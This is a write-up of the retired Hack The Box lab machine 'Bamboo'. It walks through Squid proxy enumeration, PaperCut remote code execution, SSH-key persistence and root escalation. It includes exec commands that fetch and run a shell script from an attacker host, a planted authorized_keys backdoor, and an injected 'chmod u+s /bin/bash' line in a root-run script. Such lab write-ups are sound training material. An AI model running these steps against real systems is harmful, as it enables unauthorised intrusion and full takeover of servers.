# Bamboo: Retired HTB Machine

## Enumeration

- Ports: 22,3128
- Port 3128 runs squid proxy. So I used [this article](https://www.verylazytech.com/squid-port-3128) to pentest it.
- Using [spose](https://github.com/aancw/spose) I discovered port 9191 was open through the proxy. So I used the proxy to access the page. 
- This is running PaperCut 22.0.6, none of the exploits I checked on github worked so we had to manually exploit it. I used these 2 links:
    - [Detect Exploit](https://www.exploit-db.com/exploits/51452)
    - [Run The RCE](https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software)

- Now the standard RCE won't work here, so you will have to execute each of these steps separately.
    1. `java.lang.Runtime.getRuntime().exec("wget --content-disposition http://<ip>:<port>/shell.sh");`
    2. `java.lang.Runtime.getRuntime().exec("chmod +x shell.sh");`
    3. `java.lang.Runtime.getRuntime().exec("./shell.sh");`

- This will get you a shell and user.txt

## Persistence

- Now this is something we don't usually dive into since it wasn't needed, but from here on out we will. 
- In situations where a username and password isn't given to youto login via ssh, you still can, in fact, gain ssh access after that initial shell.
- Follow the given steps:
    - Type `ssh-keygen` in your attack-box (can be your pwnbox instance or vm) and save the ssh key. If it prompts for a passphrase you can leave it blank.
    - Copy the public key (usually in the .ssh/ directory saved as something like `id_rsa.pub`) and add it to the target.
    - To do the adding, first create the .ssh directory in the user's home (if it doesnt exist already) and save this public key that you copied into a file named authorized_keys.
    - This sets up persistence. So you can just use your private key to connect.


## Privilege Escalation

Check out this [reddit post](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/)

Now on the /home/papercut/server/server.properties page, I set the admin password to `admin`, all you need to do is replace the whole value there with your necessary password.

For me I did,
`admin.password=admin`

Now here, we need to go to the print queues. On checking for running processes, perdiocically we can see this file **/home/papercut/server/bin/linux-x64/server-command** being run. So we will leverage this to gain root.

So all we need to do is to make bash suid to make it run. So I did this

```bash
#!/bin/sh
#
# (c) Copyright 1999-2013 PaperCut Software International Pty Ltd
#
# A wrapper for server-command
#

. `dirname $0`/.common

export CLASSPATH
${JRE_HOME}/bin/java \
        -Djava.io.tmpdir=${TMP_DIR} \
        -Dserver.home=${SERVER_HOME} \
        -Djava.awt.headless=true \
        -Djava.locale.providers=COMPAT,SPI \
        -Dlog4j.configurationFile=file:${SERVER_HOME}/lib/log4j2-command.properties \
        -Xverify:none \
	biz.papercut.pcng.server.ServerCommand \
	"$@"

chmod u+s /bin/bash

```

Just append `chmod u+s /bin/bash` to the file and you're good.

So go to this url `http://[your_tgt_ip]:9191/app?service=page/PrintDeploy`, go to **Import BYOD Friendly print queues** > **next** > **start importing....** > **Refresh Servers**.


This will run the binary and make bash privileged.

Then just do `/bin/bash -p`
